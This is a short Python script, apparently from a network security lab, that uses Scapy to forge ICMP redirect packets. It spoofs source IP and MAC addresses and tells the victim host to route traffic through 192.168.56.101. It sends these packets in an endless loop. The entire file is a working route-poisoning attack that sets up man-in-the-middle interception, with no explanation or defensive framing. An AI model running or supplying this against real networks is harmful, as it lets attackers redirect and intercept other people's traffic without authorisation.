from scapy.all import *


def main():
	
	dest_ip="192.168.56.102"
	src_ip="192.168.56.103"
	dest_mac="08:00:27:1A:C1:21"
	src_mac="08:00:27:36:72:04"
	send_icmpRedirect_packet(src_ip,dest_ip,src_mac,dest_mac)



def send_icmpRedirect_packet(src_ip,dest_ip,src_mac,dest_mac):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(dst=dest_ip,src=src_ip)
	icmp_h=ICMP(type=5,code=1,gw="192.168.56.101")
	pkt=eth_h/ip_h/icmp_h
	sendp(pkt,iface="eth13") 


while 1:
	main()